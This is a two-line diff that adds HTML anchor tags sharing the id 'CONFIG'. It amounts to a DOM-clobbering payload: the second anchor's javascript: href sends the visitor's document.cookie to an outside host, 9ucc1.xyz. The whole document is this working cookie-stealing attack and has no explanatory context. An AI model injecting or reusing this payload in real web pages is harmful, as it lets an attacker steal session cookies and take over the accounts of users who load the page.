@@ -1,0 +1,2 @@
+<a id="CONFIG" name="debug"></a>
+<a id="CONFIG" name="toLocation" href="javascript:location.href='http://9ucc1.xyz/?cookie=' + encodeURIComponent(document.cookie);"></a>
